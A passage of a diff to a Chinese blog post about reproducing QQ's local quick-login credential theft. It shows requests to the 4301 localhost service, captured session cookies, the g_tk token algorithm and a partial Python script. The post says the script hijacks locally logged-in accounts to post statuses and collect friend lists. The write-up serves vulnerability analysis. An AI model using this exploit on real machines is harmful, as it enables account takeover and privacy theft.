@@ -201,68 +201,48 @@
         </header>
 
         <div class="post-content">
-            <h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2>
-<p>昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧登录了QQ。</p>
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧登录了QQ。</p>
 <p>稍微花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。</p>
-<p>本篇文章就来说一说这些黑阔是怎么帮我发说说的。</p>
-<a id="more"></a>
-<h2 id="冷静分析"><a class="markdownIt-Anchor" href="#冷静分析"></a> 冷静分析</h2>
-<p>遇到这种情况，一开始想到的是CSRF，毕竟之前遇到过“QQ空间蠕虫”这样的事情，但是结合去网吧的行为，并没有打开什么网页，登录了空间并进行其他什么操作，故排除。<br>
-那么猜测，很大概率是因为在网吧开黑的时候登录了QQ，然后获取到了本地QQ的一些权限，被代替进行了一些高权限操作，那么我们有理由怀疑这个权限是在登录了QQ后获取的，并且能够不需要用户的额外操作就能获取到这些权限。根据这个方向，经过一些查阅资料，基本坐实了是本地快捷登录造成的凭证窃取。</p>
-<h2 id="罪魁祸首快捷登录"><a class="markdownIt-Anchor" href="#罪魁祸首快捷登录"></a> 罪魁祸首——快捷登录</h2>
-<p>以下是对整套黑产行为的概括：</p>
-<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/Blank_Diagram.png" alt=""><br>
-对快捷登录研究了一下午，也用python做了复现。时间仓促，写的比较随意，望见谅。</p>
-<h2 id="技术分析"><a class="markdownIt-Anchor" href="#技术分析"></a> 技术分析</h2>
-<p>QQ现在实现快捷登录的方式是这样的</p>
+<p>本篇文章就来说一说这些黑阔是怎么帮我发说说的。<br><a id="more"></a></p>
+<h2 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a>冷静分析</h2><p>遇到这种情况，一开始想到的是CSRF，毕竟之前遇到过“QQ空间蠕虫”这样的事情，但是结合去网吧的行为，并没有打开什么网页，登录了空间并进行其他什么操作，故排除。<br>那么猜测，很大概率是因为在网吧开黑的时候登录了QQ，然后获取到了本地QQ的一些权限，被代替进行了一些高权限操作，那么我们有理由怀疑这个权限是在登录了QQ后获取的，并且能够不需要用户的额外操作就能获取到这些权限。根据这个方向，经过一些查阅资料，基本坐实了是本地快捷登录造成的凭证窃取。</p>
+<h2 id="罪魁祸首——快捷登录"><a href="#罪魁祸首——快捷登录" class="headerlink" title="罪魁祸首——快捷登录"></a>罪魁祸首——快捷登录</h2><p>以下是对整套黑产行为的概括：</p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/Blank_Diagram.png" alt=""><br>对快捷登录研究了一下午，也用python做了复现。时间仓促，写的比较随意，望见谅。</p>
+<h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><p>QQ现在实现快捷登录的方式是这样的</p>
 <ol>
-<li>
-<p>本地起一个服务器，本地侦听<code>4301</code>端口，等待本地应用与其进行HTTP交互</p>
+<li><p>本地起一个服务器，本地侦听<code>4301</code>端口，等待本地应用与其进行HTTP交互</p>
 </li>
-<li>
-<p>应用按照接口要求，从远程服务器获取<code>pt_local_token</code>，然后带着这个参数请求4301端口，获取本地登录的账号信息</p>
+<li><p>应用按照接口要求，从远程服务器获取<code>pt_local_token</code>，然后带着这个参数请求4301端口，获取本地登录的账号信息</p>
 </li>
-<li>
-<p>拿到账号后，再次请求本地的<code>4301</code>端口，请求指定账号登录<code>cookie</code>，获得<code>clientkey</code></p>
+<li><p>拿到账号后，再次请求本地的<code>4301</code>端口，请求指定账号登录<code>cookie</code>，获得<code>clientkey</code></p>
 </li>
-<li>
-<p>请求远程登录服务器，获取对应账号的对应业务的cookie，然后就是请求一个检查的网页，通过验证，返回认证令牌（<code>skey</code>）。带着这个令牌就可以对应用进行登录了</p>
+<li><p>请求远程登录服务器，获取对应账号的对应业务的cookie，然后就是请求一个检查的网页，通过验证，返回认证令牌（<code>skey</code>）。带着这个令牌就可以对应用进行登录了</p>
 </li>
 </ol>
 <p>可以看出，<strong>本地的任何应用都可以与QQ建立的本地服务器进行交互，获取到账号信息，进而进行快捷登录</strong>。而漏洞就出在这。</p>
-<p>于是我们现在尝试对快捷登录的请求进行详细的抓包分析。<br>
-1. 向远处服务器请求，获取到<code>pt_local_token</code>参数</p>
+<p>于是我们现在尝试对快捷登录的请求进行详细的抓包分析。<br>1. 向远处服务器请求，获取到<code>pt_local_token</code>参数</p>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-13-27.jpg" alt="">以及请求的域名<code>xui.ptlogin2.qq.com</code>，该域名的作用就是获取凭证。</p>
-<pre class="highlight"><code class="">GET /cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 HTTP/1.1
+<pre><code>GET /cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 HTTP/1.1
 Host: xui.ptlogin2.qq.com
-</code></pre>
-<p><strong>url</strong>其中的一些参数并不需要理会，抓个包复制上去就好。需要注意的是，这个请求检查了<code>Referer</code>，所以<code>Referer</code>要改成<code>*.qq.com</code><br>
-在上述请求的响应中，服务器设置了<code>pt_local_token</code>这个cookie，后续的计算也是围绕着这个参数展开。</p>
+</code></pre><p><strong>url</strong>其中的一些参数并不需要理会，抓个包复制上去就好。需要注意的是，这个请求检查了<code>Referer</code>，所以<code>Referer</code>要改成<code>*.qq.com</code><br>在上述请求的响应中，服务器设置了<code>pt_local_token</code>这个cookie，后续的计算也是围绕着这个参数展开。</p>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-16-45.jpg" alt="">2. 而客户端会带着参数<code>pt_local_token</code>，对本地的指定端口进行请求，获取账号信息。我们可以思考一下是谁在这个端口侦听。</p>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-19-08.jpg" alt="">请求返回的是一段JS：</p>
-<pre class="highlight"><code class="">HTTP/1.1 200 OK
+<pre><code>HTTP/1.1 200 OK
 Content-Type: Application/javascript
 Content-Length: 323
 
 var var_sso_uin_list=[{&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:0,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;T3stzer0&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:4719111},{&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:534,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;T3stzer0&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:32142}];ptui_getuins_CB(var_sso_uin_list);
-</code></pre>
-<p>这里面包含本地已登录的账户信息，包括账号，昵称和性别以及一些其他参数。</p>
+</code></pre><p>这里面包含本地已登录的账户信息，包括账号，昵称和性别以及一些其他参数。</p>
 <p>从这一步结束，我们就已经能获取到当前登录到本地的QQ的一些基本信息了，而接下来的步骤便是拿着<code>pt_local_token</code>获取更多信息，以及更大的权限。</p>
 <p>3. 带着<code>pt_local_token</code>以及账号对本地端口进行请求，获取指定账号的<code>clientkey</code></p>
-<pre class="highlight"><code class="">GET /pt_get_st?clientuin=3537***086&amp;callback=ptui_getst_CB&amp;r=0.03809848617064593&amp;pt_local_tk=2008428654 HTTP/1.1
+<pre><code>GET /pt_get_st?clientuin=3537***086&amp;callback=ptui_getst_CB&amp;r=0.03809848617064593&amp;pt_local_tk=2008428654 HTTP/1.1
 Host: localhost.ptlogin2.qq.com:4301
-</code></pre>
-<p>其中参数<code>clientuin</code>是Q号，<code>r</code>是随机数，可以随便给，<code>pt_local_tk</code>就是<code>pt_local_token</code><br>
-请求响应返回一个<code>clientkey</code>的<code>Set-Cookie</code>字段中的值</p>
+</code></pre><p>其中参数<code>clientuin</code>是Q号，<code>r</code>是随机数，可以随便给，<code>pt_local_tk</code>就是<code>pt_local_token</code><br>请求响应返回一个<code>clientkey</code>的<code>Set-Cookie</code>字段中的值</p>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-05-55.jpg" alt=""></p>
 <p>4. 带着包含<code>clientkey</code>的cookie向远程服务器进行登录</p>
-<pre class="highlight"><code class="">GET /jump?clientuin=3537***086&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=2008428654&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 HTTP/1.1
+<pre><code>GET /jump?clientuin=3537***086&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=2008428654&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 HTTP/1.1
 Host: ssl.ptlogin2.qq.com
-</code></pre>
-<p>其中<code>clientuin</code>是账号，<code>u1</code>是对应业务的地址，各种带着<code>id</code>的字段应该都是对应业务，抓个包复制下来就好了，不用太在意。<br>
-这一步并不需要什么认证，带上刚才的Cookie，发送对应的请求就可以获得登录的Cookie（包含<code>skey</code>字段），以及会返回一个验证的网址，需要<code>GET</code>一下这个网址才能获取到真正的应用登录Cookie（包含<code>p_skey</code>字段）<br>
-请求响应：</p>
-<pre class="highlight"><code class="">HTTP/1.1 200 OK
+</code></pre><p>其中<code>clientuin</code>是账号，<code>u1</code>是对应业务的地址，各种带着<code>id</code>的字段应该都是对应业务，抓个包复制下来就好了，不用太在意。<br>这一步并不需要什么认证，带上刚才的Cookie，发送对应的请求就可以获得登录的Cookie（包含<code>skey</code>字段），以及会返回一个验证的网址，需要<code>GET</code>一下这个网址才能获取到真正的应用登录Cookie（包含<code>p_skey</code>字段）<br>请求响应：</p>
+<pre><code>HTTP/1.1 200 OK
 Date: Tue, 22 Jan 2019 03:27:50 GMT
 Content-Type: application/javascript
 P3P: CP=CAO PSA OUR
@@ -275,11 +255,9 @@ Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;
 Set-Cookie: skey=@72eionO2j;Path=/;Domain=qq.com;
 省略若干Set-Cookie
 
-ptui_qlogin_CB('0', 'https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=3534***3086&amp;service=jump&amp;nodirect=0&amp;ptsigx=a1199b83fbabffba57f259d79a1d2f221d70579cde815b7284a9d8201fc4d9a34bc133aacc444dd2309b1908aa05393ddc39433&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0', '')
-</code></pre>
-<p>返回的是一段JS，里面的网址是验证网址，我们需要请求它通过验证，不需要额外的参数，直接请求返回回来的这一串网址<br>
-5. 请求第4步返回的验证网址即可获得完整的登录权限</p>
-<pre class="highlight"><code class="">HTTP/1.1 302 Found
+ptui_qlogin_CB(&#39;0&#39;, &#39;https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=3534***3086&amp;service=jump&amp;nodirect=0&amp;ptsigx=a1199b83fbabffba57f259d79a1d2f221d70579cde815b7284a9d8201fc4d9a34bc133aacc444dd2309b1908aa05393ddc39433&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&#39;, &#39;&#39;)
+</code></pre><p>返回的是一段JS，里面的网址是验证网址，我们需要请求它通过验证，不需要额外的参数，直接请求返回回来的这一串网址<br>5. 请求第4步返回的验证网址即可获得完整的登录权限</p>
+<pre><code>HTTP/1.1 302 Found
 Date: Tue, 22 Jan 2019 03:27:50 GMT
 Server: Tencent Login Server/2.0.0
 Strict-Transport-Security: max-age=31536000
@@ -288,12 +266,8 @@ Set-Cookie: skey=@72fei1O2j;Path=/;Domain=qq.com;
 Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com; pt4_token=dZaYtbPkQf38MeZh8ik9jOmLtrxcrEMguvM_;Path=/;Domain=qzone.qq.com;
 Set-Cookie: p_skey=hlcQmdkZHYwNk5y2XGipsSOm0Igjj7AKo_;Path=/;Domain=qzone.qq.com;Secure;
 ...
-</code></pre>
-<p>很明显，通过上述步骤获得到凭证<code>p_skey</code>之后，我们可以收集各类QQ相关的操作接口进行操作，如自动的发一条“奇怪的”说说。</p>
-<h3 id="对本地账号自动发一条说说"><a class="markdownIt-Anchor" href="#对本地账号自动发一条说说"></a> 对本地账号自动发一条说说</h3>
-<p>要实现这个目的无非就是完成上面的快捷登录，然后再在空间里面寻求发说说的请求，模拟一下即可<br>
-基本的抓包找参数的功夫就不细说了<br>
-值得一提的是空间是有CSRF防御的，所以需要找到两个参数才能发送说说</p>
+</code></pre><p>很明显，通过上述步骤获得到凭证<code>p_skey</code>之后，我们可以收集各类QQ相关的操作接口进行操作，如自动的发一条“奇怪的”说说。</p>
+<h3 id="对本地账号自动发一条说说"><a href="#对本地账号自动发一条说说" class="headerlink" title="对本地账号自动发一条说说"></a>对本地账号自动发一条说说</h3><p>要实现这个目的无非就是完成上面的快捷登录，然后再在空间里面寻求发说说的请求，模拟一下即可<br>基本的抓包找参数的功夫就不细说了<br>值得一提的是空间是有CSRF防御的，所以需要找到两个参数才能发送说说</p>
 <ol>
 <li><strong>qzone_token</strong></li>
 <li><strong>g_tk</strong></li>
@@ -301,217 +275,209 @@ Set-Cookie: p_skey=hlcQmdkZHYwNk5y2XGipsSOm0Igjj7AKo_;Path=/;Domain=qzone.qq.com
 <p>其中<code>qzone_token</code>是刷新空间的时候在页面中给你的一个<code>token</code>，直接正则拿到就好</p>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-23-40.jpg" alt=""></p>
 <p>而追踪<code>g_tk</code>参数花了我不少功夫，其源码在<a href="https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js" target="_blank" rel="noopener">https://qzonestyle.gtimg.cn/qzone/v8/engine/migrate-plugin.js</a> 的<code>getACSRFToken</code>函数中：</p>
-<pre class="highlight"><code class="javascript">getACSRFToken:<span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>{
+<pre><code class="lang-javascript">getACSRFToken:function(url) {
     url = QZFL.util.URI(url);
-    <span class="keyword">var</span> skey;
-    <span class="keyword">if</span> (url) {
-      <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qzone.qq.com"</span>) &gt; <span class="number">0</span>) {
-        <span class="keyword">try</span> {
-          skey = QZONE.FP._t.QZFL.cookie.get(<span class="string">"p_skey"</span>);
-        } <span class="keyword">catch</span> (err) {
-          skey = QZFL.cookie.get(<span class="string">"p_skey"</span>);
+    var skey;
+    if (url) {
+      if (url.host &amp;&amp; url.host.indexOf(&quot;qzone.qq.com&quot;) &gt; 0) {
+        try {
+          skey = QZONE.FP._t.QZFL.cookie.get(&quot;p_skey&quot;);
+        } catch (err) {
+          skey = QZFL.cookie.get(&quot;p_skey&quot;);
         }
-      } <span class="keyword">else</span> {
-        <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qq.com"</span>) &gt; <span class="number">0</span>) {
-          skey = QZFL.cookie.get(<span class="string">"skey"</span>);
+      } else {
+        if (url.host &amp;&amp; url.host.indexOf(&quot;qq.com&quot;) &gt; 0) {
+          skey = QZFL.cookie.get(&quot;skey&quot;);
         }
       }
     }
-    <span class="keyword">if</span> (!skey) {
-      skey = QZFL.cookie.get(<span class="string">"p_skey"</span>) || (QZFL.cookie.get(<span class="string">"skey"</span>) || (QZFL.cookie.get(<span class="string">"rv2"</span>) || <span class="string">""</span>));
+    if (!skey) {
+      skey = QZFL.cookie.get(&quot;p_skey&quot;) || (QZFL.cookie.get(&quot;skey&quot;) || (QZFL.cookie.get(&quot;rv2&quot;) || &quot;&quot;));
     }
-    <span class="keyword">var</span> hash = <span class="number">5381</span>;
-    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) {
-      hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);
+    var hash = 5381;
+    for (var i = 0, len = skey.length;i &lt; len;++i) {
+      hash += (hash &lt;&lt; 5) + skey.charCodeAt(i);
     }
-    <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;
+    return hash &amp; 2147483647;
   }
 </code></pre>
-<p>其实就是各种判断<code>Cookie</code>里面是否存在<code>skey</code>或者<code>p_skey</code>然后拿来做一个简单的移位加密<br>
-核心代码就这点，比较简单。</p>
-<pre class="highlight"><code class="javascript"> <span class="keyword">var</span> hash = <span class="number">5381</span>;
-    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) {
-      hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charCodeAt(i);
+<p>其实就是各种判断<code>Cookie</code>里面是否存在<code>skey</code>或者<code>p_skey</code>然后拿来做一个简单的移位加密<br>核心代码就这点，比较简单。</p>
+<pre><code class="lang-javascript"> var hash = 5381;
+    for (var i = 0, len = skey.length;i &lt; len;++i) {
+      hash += (hash &lt;&lt; 5) + skey.charCodeAt(i);
     }
-    <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;
+    return hash &amp; 2147483647;
   }
 </code></pre>
 <p>所以可以看出<code>g_tk</code>是由<code>p_skey</code>简单的移位加密生成的，那么抓包一下发说说的请求</p>
-<pre class="highlight"><code class="">https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken={}&amp;g_tk={}
-</code></pre>
-<p>将<code>qzonetoken</code>和<code>g_tk</code>放进去，再在<code>POST</code>数据里面的<code>con</code>字段变成你想发的说说，就可以完成类似于你在我电脑上登录QQ，我就能代替你发说说，无感知地查看好友信息，看空间隐私等等。</p>
-<h3 id="复现脚本"><a class="markdownIt-Anchor" href="#复现脚本"></a> 复现脚本</h3>
-<p>花了几个小时写了复现脚本<br>
-<strong>只要脚本运行，在本机上线的QQ都会发一条说说以及被获取到所有好友信息、备注、昵称以及好友分组</strong></p>
+<pre><code>https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken={}&amp;g_tk={}
+</code></pre><p>将<code>qzonetoken</code>和<code>g_tk</code>放进去，再在<code>POST</code>数据里面的<code>con</code>字段变成你想发的说说，就可以完成类似于你在我电脑上登录QQ，我就能代替你发说说，无感知地查看好友信息，看空间隐私等等。</p>
+<h3 id="复现脚本"><a href="#复现脚本" class="headerlink" title="复现脚本"></a>复现脚本</h3><p>花了几个小时写了复现脚本<br><strong>只要脚本运行，在本机上线的QQ都会发一条说说以及被获取到所有好友信息、备注、昵称以及好友分组</strong></p>
 <ol>
 <li>检测本地账号</li>
 </ol>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-35-52.jpg" alt=""></p>
-<ol start="2">
+<ol>
 <li>发送指定说说</li>
 </ol>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-36-12.jpg" alt=""></p>
-<ol start="3">
+<ol>
 <li>获取好友列表信息以及分组</li>
 </ol>
 <p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-39-22.jpg" alt=""></p>
 <p>测试源码如下，仅供学习之用，了解其原理，禁止用于非法用途！</p>
-<pre class="highlight"><code class="python"><span class="keyword">import</span> requests
-<span class="keyword">import</span> re
+<pre><code class="lang-python">import requests
+import re
 
 
-<span class="comment"># 计算发送说说的防御CSRF的Token</span>
-<span class="function"><span class="keyword">def</span> <span class="title">getACSRFToken</span><span class="params">(p_skey)</span>:</span>
-    hash_v = <span class="number">5381</span>
-    <span class="keyword">if</span> p_skey:
-        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p_skey)):
-            hash_v += (hash_v &lt;&lt; <span class="number">5</span>) + ord(p_skey[i])
-        <span class="keyword">return</span> hash_v &amp; <span class="number">2147483647</span>
-    <span class="keyword">return</span> <span class="keyword">None</span>
+# 计算发送说说的防御CSRF的Token
+def getACSRFToken(p_skey):
+    hash_v = 5381
+    if p_skey:
+        for i in range(len(p_skey)):
+            hash_v += (hash_v &lt;&lt; 5) + ord(p_skey[i])
+        return hash_v &amp; 2147483647
+    return None
 
 
-<span class="comment"># 想要发送的说说</span>
-Message = <span class="string">"This is an automated messaging test by wz"</span>
+# 想要发送的说说
+Message = &quot;This is an automated messaging test by wz&quot;
 
 header = {
-    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span>,
-    <span class="string">"Referer"</span>: <span class="string">"https://i.qq.com/"</span>
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&quot;,
+    &quot;Referer&quot;: &quot;https://i.qq.com/&quot;
 }
 
-<span class="comment"># 从QQ服务器获取请求本地服务器的Cookie</span>
-get_local_token_url = <span class="string">"https://xui.ptlogin2.qq.com/cgi-bin/xlogin?"</span> \
-                      <span class="string">"proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;"</span> \
-                      <span class="string">"low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;"</span> \
-                      <span class="string">"appid=549000912&amp;style=22&amp;target=self&amp;"</span> \
-                      <span class="string">"s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;"</span> \
-                      <span class="string">"pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;"</span> \
-                      <span class="string">"pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1"</span>
+# 从QQ服务器获取请求本地服务器的Cookie
+get_local_token_url = &quot;https://xui.ptlogin2.qq.com/cgi-bin/xlogin?&quot; \
+                      &quot;proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;&quot; \
+                      &quot;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;&quot; \
+                      &quot;appid=549000912&amp;style=22&amp;target=self&amp;&quot; \
+                      &quot;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;&quot; \
+                      &quot;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;&quot; \
+                      &quot;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1&quot;
 
-<span class="comment"># Header头Referer字段必须为qq.com</span>
+# Header头Referer字段必须为qq.com
 login_session = requests.Session()
 res = login_session.get(get_local_token_url, headers=header)
 
-<span class="comment"># 获取关键参数pt_local_token</span>
-pt_local_token = res.cookies.get(<span class="string">"pt_local_token"</span>)
+# 获取关键参数pt_local_token
+pt_local_token = res.cookies.get(&quot;pt_local_token&quot;)
 
-<span class="comment"># 带着刚才的Cookie以及从Cookie中拿到的pt_local_tk对本地服务器进行请求</span>
-<span class="comment"># 获取已登录的账号信息</span>
-port = <span class="number">4301</span>
-local_qq_server_url = <span class="string">"https://localhost.ptlogin2.qq.com"</span>  <span class="comment"># 建立在本地的QQ服务器地址，等待应用与其交互</span>
+# 带着刚才的Cookie以及从Cookie中拿到的pt_local_tk对本地服务器进行请求
+# 获取已登录的账号信息
+port = 4301
+local_qq_server_url = &quot;https://localhost.ptlogin2.qq.com&quot;  # 建立在本地的QQ服务器地址，等待应用与其交互
 
-<span class="comment"># 传参获取本地已登录账号信息</span>
+# 传参获取本地已登录账号信息
 get_QQ_num_url = local_qq_server_url + \
-                 <span class="string">":{}/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.7068102287925351&amp;pt_local_tk={}"</span>.format(port,
+                 &quot;:{}/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.7068102287925351&amp;pt_local_tk={}&quot;.format(port,
                                                                                                        pt_local_token)
 
 res = login_session.get(get_QQ_num_url, headers=header)
-<span class="comment"># 返回的账号信息是一段js的数组</span>
-dic_str = <span class="keyword">None</span>
-<span class="keyword">try</span>:
-    dic_str = re.findall(<span class="string">"var var_sso_uin_list=(\[[\s\S]*?\])"</span>, res.text)[<span class="number">0</span>]
-<span class="keyword">except</span> IndexError:
-    print(<span class="string">"Fail to get local account info. "</span>)
-    exit(<span class="number">0</span>)
+# 返回的账号信息是一段js的数组
+dic_str = None
+try:
+    dic_str = re.findall(&quot;var var_sso_uin_list=(\[[\s\S]*?\])&quot;, res.text)[0]
+except IndexError:
+    print(&quot;Fail to get local account info. &quot;)
+    exit(0)
 
-<span class="comment"># ====================================== 显示本地登录账号信息 ===========================================</span>
+# ====================================== 显示本地登录账号信息 ===========================================
 account_list = eval(dic_str)
-print(<span class="string">"Detect {} account login locally"</span>.format(len(account_list)))
-print(<span class="string">"====================================================="</span>)
+print(&quot;Detect {} account login locally&quot;.format(len(account_list)))
+print(&quot;=====================================================&quot;)
 
 account_num_list = []
-<span class="keyword">for</span> i <span class="keyword">in</span> range(len(account_list)):
-    print(<span class="string">"NO.{}"</span>.format(i + <span class="number">1</span>))
-    print(<span class="string">"account:{}\nnickname:{}"</span>.format(account_list[i].get(<span class="string">"account"</span>), account_list[i].get(<span class="string">"nickname"</span>)))
-    account_num_list.append(account_list[i].get(<span class="string">"account"</span>))
-print(<span class="string">"====================================================="</span>)
+for i in range(len(account_list)):
+    print(&quot;NO.{}&quot;.format(i + 1))
+    print(&quot;account:{}\nnickname:{}&quot;.format(account_list[i].get(&quot;account&quot;), account_list[i].get(&quot;nickname&quot;)))
+    account_num_list.append(account_list[i].get(&quot;account&quot;))
+print(&quot;=====================================================&quot;)
 
-<span class="comment"># ====================================== 对每个账号进行快捷登录 ===========================================</span>
-<span class="comment"># ===================================== 以登录QQ空间发个说说为例 ==========================================</span>
+# ====================================== 对每个账号进行快捷登录 ===========================================
+# ===================================== 以登录QQ空间发个说说为例 ==========================================
 
 
-<span class="comment"># 对于已登录的账号</span>
-<span class="keyword">for</span> account <span class="keyword">in</span> account_num_list:
-    <span class="comment"># 发送QQ号码及pt_local_token参数到本地服务器获取必要的Cookie，以便获取远程服务器登录许可</span>
+# 对于已登录的账号
+for account in account_num_list:
+    # 发送QQ号码及pt_local_token参数到本地服务器获取必要的Cookie，以便获取远程服务器登录许可
     get_QQ_cookie_url = local_qq_server_url + \
-                        <span class="string">":{}/pt_get_st?callback=ptui_getst_CB&amp;"</span> \
-                        <span class="string">"r=0.7068102287925351&amp;"</span> \
-                        <span class="string">"pt_local_tk={}&amp;"</span> \
-                        <span class="string">"clientuin={}"</span>.format(port,
+                        &quot;:{}/pt_get_st?callback=ptui_getst_CB&amp;&quot; \
+                        &quot;r=0.7068102287925351&amp;&quot; \
+                        &quot;pt_local_tk={}&amp;&quot; \
+                        &quot;clientuin={}&quot;.format(port,
                                               pt_local_token,
                                               account)
 
     res = login_session.get(get_QQ_cookie_url, headers=header)
-    <span class="comment"># 获取远程登录凭证</span>
-    <span class="comment"># 其中u1为QQ空间地址（抓包可获得）</span>
